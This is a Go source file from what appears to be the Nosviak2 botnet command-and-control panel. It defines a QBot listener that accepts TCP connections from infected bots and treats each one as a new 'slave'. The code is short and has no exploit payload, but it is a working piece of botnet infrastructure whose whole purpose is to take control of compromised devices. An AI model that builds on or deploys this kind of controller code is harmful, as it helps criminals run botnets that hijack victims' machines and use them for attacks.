package qbot

import (
	"Nosviak2/core/sources/layouts/toml"
	"fmt"
	"net"
)

//creates the handler properly for qbot
//this will start accepting connections safely
func NewHandler() error { //error returned from function

	//creates our new network env properly
	//accepts connections from qbots properly
	network, err := net.Listen("tcp", toml.ConfigurationToml.Qbot.Listener)
	if err != nil { //err handles properly
		return err
	} else { //little success message for listener started
		fmt.Printf("[Qbot_Listener] [Qbot server has been started within Nosviak] [%s]\r\n", toml.ConfigurationToml.Qbot.Listener)
	}

	//loops accepting properly
	//this will ensure everything we need
	for { //accepts connections properly
		connection, err := network.Accept()
		if err != nil { //err handles properly
			continue
		}

		//handles the connection properly
		//this will handle as a new slave properly
		HandleConnection(connection)
	}


	return nil
}